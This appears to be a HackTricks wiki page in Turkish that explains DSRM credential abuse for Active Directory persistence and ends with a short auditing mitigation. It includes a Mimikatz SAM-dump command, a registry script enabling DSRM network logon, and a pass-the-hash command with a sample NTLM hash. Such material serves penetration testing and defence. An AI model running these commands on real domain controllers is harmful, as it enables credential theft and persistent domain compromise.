# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

Her etki alanı denetleyicisinde bir Directory Services Restore Mode (DSRM) yönetici hesabı bulunur. Bu hesabın parolası, etki alanı denetleyicisinin yükseltilmesi sırasında ayarlanır ve Active Directory etki alanı hesaplarından ayrıdır.<sup>[[1]](#references)</sup>

Bir etki alanı denetleyicisi üzerinde yönetici denetimine sahip bir saldırgan, yerel SAM veritabanını dump edebilir ve DSRM Administrator NTLM hash değerini kurtarabilir. Aşağıdaki Mimikatz komutu bu işlemi gerçekleştirir:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Varsayılan olarak DSRM hesabı, geri yükleme modu için tasarlanmıştır. `DsrmAdminLogonBehavior` değerinin `2` olarak ayarlanması, bu yerel hesabın etki alanı denetleyicisi normal şekilde çalışırken kimlik doğrulaması yapmasına izin verir. Değeri değiştirmeden önce kontrol edin:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
Kurtarılan hash daha sonra yönetici `C$` paylaşımı gibi kaynaklara erişmek için bir pass-the-hash oturumunda kullanılabilir. Bu yerel hesap için `/domain` değeri olarak domain controller'ın bilgisayar adını kullanın:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Azaltma

- `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` üzerindeki değişiklikleri denetleyin. Anahtarın SACL'si **Set Value** işlemlerini denetleyecek şekilde yapılandırıldığında, 4657 güvenlik olayı bir kayıt defteri değerinin değiştirilmesini kaydeder.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Directory Services Restore Mode yönetici parolasını sıfırlama](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Gizli Active Directory Persistence #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Gizli Active Directory Persistence #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Olay 4657 — Bir kayıt defteri değeri değiştirildi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
